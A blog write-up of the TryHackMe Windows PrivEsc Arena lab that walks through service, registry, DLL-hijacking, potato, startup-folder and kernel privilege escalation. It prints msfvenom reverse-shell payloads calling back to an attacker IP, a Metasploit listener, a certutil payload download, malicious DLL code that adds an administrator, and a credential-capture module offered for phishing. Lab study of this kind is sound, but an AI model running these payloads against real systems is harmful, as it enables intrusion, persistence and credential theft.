---
title: "Windows-PrivEsc-Arena TryHackMe writeup"
date: 2022-04-26T00:52:13+02:00

categories:
  - windows
tags:
  - TryHackme
  - windows-privesc
---

During studying the [TCM windows privilege escalation course](https://academy.tcm-sec.com/p/windows-privilege-escalation-for-beginners) this is the [Lab](https://tryhackme.com/room/windowsprivescarena) designed to cover the topics mentioned in the course. it has been a while since i revised my notes regrading this course so this is a detailed write-up for the room. also i have re-ordered the content to be as an ordered checklist

<!--more-->

this room covers :

- [Service Escalation - Unquoted Service Paths](#service-escalation---unquoted-service-paths)
- [Service Escalation - DLL Hijacking](#service-escalation---dll-hijacking)
- [Service Escalation - Registry](#service-escalation---registry)
- [Service Escalation - Executable Files](#service-escalation---executable-files)
- [Service Escalation - binPath](#service-escalation---binpath)
- [Potato Escalation - Hot Potato](#potato-escalation---hot-potato)
- [Registry Escalation - Autorun](#registry-escalation---autorun)
- [Registry Escalation - AlwaysInstallElevated](#registry-escalation---alwaysinstallelevated)
- [Privilege Escalation - Startup Applications](#privilege-escalation---startup-applications)
- [Password Mining Escalation - Memory](#password-mining-escalation---memory)
- [Privilege Escalation - Kernel Exploits](#privilege-escalation---kernel-exploits)
- [quick commands](#quick-commands)

---

- first you need to connect to THM with the openvpn as mentioned in task-1 , let's drive into the Room itself.
- As the room is discussing privilege escalation so it assumes you have compromised a windows machine in any way and you are now against the privesc step , that's why you are given the RDP connection directly.

- connect with RDP :

```powershell
rdesktop 10.10.14.235 -u user -p password321
```

## Service-Escalation - Unquoted Service Paths

- Unquoted path escalation is the case when a service path is like :

```powershell
C:\Program Files\example 2\app.exe
```

- what happens to run the app.exe is as following:

```
# Try :
C:\Program.exe
# if not found try :
C:\Program Files\example.exe
# if not found try :
C:\Program Files\example 2\app.exe
```

- so if we have write access to the `C:\program Files\` we can place our `example.exe` so it can be used instead of the actual `app.exe` , and we can place a malicious app that can get us a reverse connection
- the mitigation is quite straight forward : `"C:\Program Files\example 2\app.exe"`
- Attack example :
- first you need to list the services along with the path :

```powershell
Get-WmiObject win32_service | Select-Object Name, State, PathName
```

![image](/media/windowsprivescarena/20220426022212.png)

- to **query the configuration information for a specified service** we use :

```powershell
sc qc unqoutedsvc
```

![image](/media/windowsprivescarena/20220426022509.png)

- now as we can see under the `BINARY_PATH` it is not quoted so we can try our luck there
- use `accesschk64.exe` to check our permissions for that path

![image](/media/windowsprivescarena/20220426022820.png)

- we can write into the path the following : `C:\Program\Unquoted path service\common.exe`
- so let's generate the payload with msfvenom and send it to that path , then start the service

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=1337 -f exe -o  common.exe
```

![image](/media/windowsprivescarena/20220426023424.png)

![image](/media/windowsprivescarena/20220426023436.png)

- note that when the last sc command halts then terminated you will lose your connection so it is better to make a better than a reverse connection like adding a user to the administrator group instead :

```powershell
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
```

![image](/media/windowsprivescarena/20220426023931.png)

## Service Escalation - DLL Hijacking

- My favorite escalation way , DLL Hijacking is very common escalation Factor you should consider,it is a little tricky to detect But easy to abuse.
- attackers usually copy the suspected executables and run them at their lab to analyze them
- in this lab we are working in same machine , you need [Process Monitor](https://docs.microsoft.com/en-us/sysinternals/downloads/procmon) it is like `pspy` in linux But it tells us details about a process as we will see
- the idea behind DLL Hijacking is : finding a process searches for a DLL and not able to find it
- if we the attacker can write to the path , the process searches through , we can craft our own malicious DLL to perform administrative actions
- add the filters :

![image](/media/windowsprivescarena/20220425055638.png)

![image](/media/windowsprivescarena/20220425055742.png)

![image](/media/windowsprivescarena/20220425060520.png)

- focusing on this `dllhijackservice` to understand how it searches for dlls :

![image](/media/windowsprivescarena/20220425060621.png)

- it searches for a dll under ` C:\Temp` which we have access to write

![image](/media/windowsprivescarena/20220425060723.png)

- we craft our payload then place it in the `C:\Temp:\hijackme.dll` then start the service , the next time it starts it will find the missed dll and execute it

```powershell
#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
if (dwReason == DLL_PROCESS_ATTACH) {
system("cmd.exe /k net localgroup administrators user /add");  //replace command
ExitProcess(0);
}
return TRUE;
}
```

- compile it as dll :

```powershell
x86_64-w64-mingw32-gcc  dll.c -shared -o hijackme.dll
```

- move it and restart the service :

![image](/media/windowsprivescarena/20220425062428.png)

- the user has been added to the local administrators group

## Service Escalation - Registry

- List them :

```cmd
reg query HKLM\SYSTEM\CurrentControlSet\Services
```

- search for a service has `NT AUTHORITY\INTERACTIVE allow FullControl` :

```cmd
Get-Acl HKLM:\SYSTEM\CurrentControlSet\Services\regsvc | fl
```

![image](/media/windowsprivescarena/20220425043012.png)

- use the code [here](https://raw.githubusercontent.com/sagishahar/scripts/master/windows_service.c)
- add what ever code you want to execute for example add current user to the administrator group

```cmd
cmd.exe /k net localgroup administrators user /add
```

- cross compile it :

```powershell
i686-w64-mingw32-gcc windows_service.c -o fake.exe
```

- send it to the windows then :

```powershell
reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\fake.exe /f
```

![image](/media/windowsprivescarena/20220425050400.png)

- and we can see the user has been added to the local administrator group, trying to perform an administrative action the ACL will accept our password to grantee this action :

![image](/media/windowsprivescarena/20220425050748.png)

## Service Escalation - Executable Files

- finding a service we can overwrite and restart the service will gain us a reverse shell
- we can search for them by a tool like `powerup.ps1` or manually with `accesschk64.exe` on the services running , we can list them with powershell:

```powershell
Get-Service | Where-Object {$_.Status -eq "Running"}
```

or cmd :

```powershell
sc.exe query type=service
```

![image](/media/windowsprivescarena/20220425052239.png)

- we see this file has write access by every body , we can simply generate with msfvenom a reverse executable and replace it , then start the service again :

![image](/media/windowsprivescarena/20220425052507.png)

![image](/media/windowsprivescarena/20220425052537.png)

![image](/media/windowsprivescarena/20220425052548.png)

- we could also use the same exe from the registry escalation section

## Service Escalation - binPath

- we are after a service that has RW access for Everyone , we can search for it with :

```powershell
 .\accesschk64.exe -wuvc Everyone *
```

![image](/media/windowsprivescarena/20220426032527.png)

- if we have the : `SERVICE_CHANGE_CONFIG`
- we can now leverage our privilege by writing a new configuration then start the service

```powershell
sc config daclsvc binpath= "net localgroup administrators user /add"
```

![image](/media/windowsprivescarena/20220426032937.png)

![image](/media/windowsprivescarena/20220426032947.png)

## Potato Escalation - Hot Potato

- the potato attacks are so famous when it comes to windows , actually there are more than one type of potato attack , you can refer to [this](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html) blog.
- the attack vector was fixed in `MS16-075` , probably windows 7 is vulnerable.
- we can list last updates :

```cmd
wmic qfe list full /format:table
```

- searching for the 3 installs , will find none of them patching the vuln
- there are multiple ways to attack hot potato like metasploit , powershell , potato.exe , refer [here](https://pentestlab.blog/2017/04/13/hot-potato/)

```powershell
. .\tater.ps1
Invoke-Tater -Trigger 1 -Command "net localgroup administrators user /add"
```

![image](/media/windowsprivescarena/20220425064312.png)

- and we can see the user has been added to the local administrator Group

## Registry Escalation - Autorun

- first you need to run [Autoruns64.exe](https://docs.microsoft.com/en-us/sysinternals/downloads/autoruns) to list the auto runs applications

![image](/media/windowsprivescarena/20220422205427.png)

- we can notice the program.exe running under `C:\Program Files\Autorun Program\` ,now we should use `accesschk64.exe` to check our privilege on that path

![image](/media/windowsprivescarena/20220422205719.png)

- it has read/write access For everyone , so we can replace the `program.exe` with a malicious payload to gain a reverse shell as higher privilege

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=9090 -f exe -o  program.exe
```

- fire up your http server then from the windows machine download it :

```cmd
certutil -urlcache -f http://10.9.0.37:8888/program.exe program.exe
```

- rename it to `program.exe` as the auto runner program , copy & overwrite it :

![image](/media/windowsprivescarena/20220422210828.png)

- now set you listener :

```bash
msfconsole -x "use exploit/multi/handler;set LHOST 10.9.0.37;set LPORT 9090;set payload windows/meterpreter/reverse_tcp;run"
```

- login with admin account :

```powershell
rdesktop 10.10.174.128  -u TCM -p Hacker12
```

![image](/media/windowsprivescarena/20220425041654.png)

![image](/media/windowsprivescarena/20220425041715.png)

## Registry Escalation - AlwaysInstallElevated

check `AlwaysinstalledElevated` is on if the value `= 0x1`

```powershell
reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer
```

![image](/media/windowsprivescarena/20220425042010.png)

craft msi payload :

```powershell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=7878 -f msi -o setup.msi
```

move it to the machine and run it :

![image](/media/windowsprivescarena/20220425042353.png)

![image](/media/windowsprivescarena/20220425042406.png)

## Privilege Escalation - Startup Applications

- we can search for this attack vector by running :

```powershell
icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
```

![image](/media/windowsprivescarena/20220425053053.png)

we can see that Builtin\Users has the **F** flag meaning full control , Built-in user account is **a type of user account that is created during installation**

- simply copy a malicious executable to `C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\`
- then when an administrator logs in you will gain a reverse shell

![image](/media/windowsprivescarena/20220425053954.png)

![image](/media/windowsprivescarena/20220425054009.png)

## Password Mining Escalation - Memory

- the discussed attack can be helpful in phishing demonstration , will use metasploit as :

```powershell
msfconsole -x "use auxiliary/server/capture/http_basic;set uripath x ; run"
```

- This module responds to all requests for resources with a HTTP 401. This should cause most browsers to prompt for a credential. If the user enters Basic Auth creds they are sent to the console

![image](/media/windowsprivescarena/20220426025112.png)

![image](/media/windowsprivescarena/20220426025125.png)

- and we have captured his password as we see ;)
- for password mining winpeas are helpful hence it searches for any file its name or content contain words like passwords , key , .. etc

## Privilege Escalation - Kernel Exploits

- when it comes to old versions of windows (xp,7,8) it most likely can be exploit using kernel exploitation techniques.
- to detect if it is vulnerable , run `systeminfo` ,take the output and pass it to [Windows-Exploit-Suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester) tool
- **NOTE** `windows-exploit-suggester` can reveal other attack vectors rather than the kernel exploits

```powershell
python windows-exploit-suggester.py --database 2022-04-25-mssb.xls --systeminfo ~/CTFs/Tryhackme/windowsprivescarena/kernel_search
```

- but the easiest way is to get a meterpreter shell and use the run `local_exploit_suggester`
- note that exploiting not compatible kernel exploit can harm the system , so keep it your last option

![image](/media/windowsprivescarena/20220425071551.png)

![image](/media/windowsprivescarena/20220425072907.png)

## Automation

- there a lot of tools you can use like [Winpeas](https://github.com/carlospolop/PEASS-ng/releases/download/20220424/winPEASx64.exe) , But Let's Try [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)

![image](/media/windowsprivescarena/20220426034956.png)

![image](/media/windowsprivescarena/20220426035018.png)

## Quick commands

`Download files from your http server to windows :`

```cmd
certutil -urlcache -f <url> <outfile_name>
Invoke-WebRequest -Uri <url> -OutFile <outfile_name>
```

- Remember if you are going to use ftp server , in case moving exe files to use `binary on`

`Generate payloads :`

```bash
# exe payload to get reverse shell
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=1337 -f exe -o  common.exe
# exe payload to execute commands
msfvenom -p windows/exec CMD='net localgroup administrators user /add' -f exe-service -o common.exe
# msi payload (for AlwaysInstallElevated)
msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.9.0.37 LPORT=7878 -f msi -o setup.msi
```

- quick msfconsole listener :

```bash
msfconsole -x "use exploit/multi/handler;set LHOST <ip>;set LPORT <port>;set payload windows/meterpreter/reverse_tcp;run"
```

### Useful Resources :

- [Potatoes_Windows_Privesc](https://jlajara.gitlab.io/others/2020/11/22/Potatoes_Windows_Privesc.html)
- [windows-enumeration](https://nored0x.github.io/red-teaming/windows-enumeration/)
- [msfveom-cheatsheet](https://liberty-shell.com/sec/2018/02/10/msfv/)
- [PayloadsAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md)
- [hacktricks](https://book.hacktricks.xyz/windows/windows-local-privilege-escalation)
- [lolbas-project](https://lolbas-project.github.io/)
